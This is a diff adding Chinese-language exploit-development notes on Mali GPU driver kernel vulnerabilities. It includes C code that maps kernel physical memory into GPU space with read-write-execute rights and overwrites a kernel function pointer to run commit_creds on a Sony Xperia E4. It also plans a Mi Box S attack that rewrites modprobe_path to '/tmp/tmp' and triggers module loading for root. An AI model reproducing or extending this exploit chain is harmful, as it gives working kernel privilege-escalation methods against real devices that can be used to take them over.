@@ -535,4 +535,96 @@ adb shell "chmod 755 /data/local/tmp/output && /data/local/tmp/output"
 ⑥ 获得 root shell        → 最终目标
 ```
 
-当前进度：① ✅ ② ✅ ③ ✅ ④ 🚧（字符串对齐问题） ⑤ ❌ ⑥ ❌
+当前进度：① ✅ ② ✅ ③ ✅ ④ ✅（"/tmp/tmp" 方案） ⑤ ❌ ⑥ ❌
+
+## Sony Xperia E4 root 方法分析 (2026-08-26 补充)
+
+### Sony 利用链
+```
+① MAP_EXT_MEM 映射内核物理页到 GPU VA  (漏洞本身)
+② PP Job WB 写入函数指针地址         (get_root_shell 地址)
+③ /proc/driver/wmt_dbg 触发执行       (MTK 特有接口)
+④ 内核态跳转到用户态 get_root_shell    (32位内核无PAN)
+⑤ commit_creds(prepare_kernel_cred()) → root
+```
+
+### 关键代码
+```c
+// 映射内核物理页
+mali_map_ext_mem_s ext_args;
+ext_args.phys_addr    = TARGET_PHYS_ADDR;   // 内核物理地址
+ext_args.mali_address = GPU_VA_TARGET;      // GPU VA
+ext_args.rights       = 0x37;               // READ|WRITE|EXEC
+ioctl(fd, MALI_IOC_MEM_MAP_EXT, &ext_args);
+
+// WB 写入函数指针
+job.frame_registers[FR_CLEAR_COLOR] = (uint32_t)get_root_shell;
+job.wb0_registers[WB_ADDRESS] = wb_target;   // 内核函数指针对应的 GPU VA
+
+// 触发: /proc/driver/wmt_dbg 会调用被篡改的函数指针
+write(wmt_fd, "1 42424242 42424242", ...);
+```
+
+### Mi Box S 为什么不能直接用这个方法
+| 特性 | Sony Xperia E4 | Mi Box S | 影响 |
+|------|---------------|----------|------|
+| 内核位数 | 32位 | 64位 | 函数指针 8 字节 |
+| PAN 保护 | 无 | 有 | 内核不能执行用户态代码 |
+| KASLR | 可能无 | 有？ | 地址可能随机化 |
+| 触发点 | /proc/driver/wmt_dbg (MTK) | 无 (Amlogic) | 需要其他触发方式 |
+| 漏洞 ioctl | MAP_EXT_MEM (nr=13) | BIND_MEM (nr=2) | 接口不同 |
+
+### Mi Box S 最佳方案: modprobe_path
+- 不需要内核代码执行（payload 在用户态以 root 运行）
+- 不受 PAN 保护影响
+- 不需要知道内核代码地址（只需要 modprobe_path 物理地址，固定）
+- 已验证物理地址固定（无 KASLR 对物理地址的影响）
+
+## "/tmp/tmp" 方案 - 字符串写入问题的解
+
+### 原理
+WB 写入的 4 字节重复模式限制：整个写入区域都是同一个 RGBA 值的重复。
+但 **modprobe_path 只需要一个有效路径**，如果路径本身就是 4 字节重复模式，就能一次写入成功。
+
+### 方案
+`/tmp/tmp` 正好是 "/tmp" 重复两次（8 字节）：
+- 字节 0-3: '/', 't', 'm', 'p'  → "/tmp"
+- 字节 4-7: '/', 't', 'm', 'p'  → "/tmp"
+- 字节 8+: '\0' (null 终止)
+
+### 两步写入法
+```
+Step 1: offset 0, RGBA=('/','t','m','p')
+  → 字节 0-183 = "/tmp" 重复 46 次
+  → modprobe_path[0:8] = "/tmp/tmp"
+
+Step 2: offset 8, RGBA=(0,0,0,0)
+  → 字节 8-191 = 0
+  → modprobe_path[8] = '\0' (字符串结束)
+
+结果: modprobe_path = "/tmp/tmp" (8字节 + null)
+```
+
+### 对应文件
+- `kort_modprobe_2step.c` - 已实现此方案
+
+### 待验证
+1. ✅ 写入原语可行
+2. ❌ /tmp 目录是否存在且可写
+3. ❌ /tmp/tmp 脚本能否被内核执行（SELinux 上下文）
+4. ❌ 触发 modprobe 的可靠方式
+
+### modprobe 触发方式探索
+- socket(PF_BLUETOOTH) - 可能被 SELinux 阻止
+- mount(bogus_fs) - 可能被 SELinux 阻止
+- 其他方式：keyctl、request_module() 调用路径
+
+## 下一步行动计划
+
+### 立即执行
+1. 编译 kort_modprobe_2step.c 和 trigger_modprobe.c
+2. 设备上测试 /tmp 是否存在、是否可写
+3. 创建 /tmp/tmp payload 脚本
+4. 运行 kort_modprobe_2step 修改 modprobe_path
+5. 运行 trigger_modprobe 触发
+6. 检查 /data/local/tmp/rooted.txt 是否生成
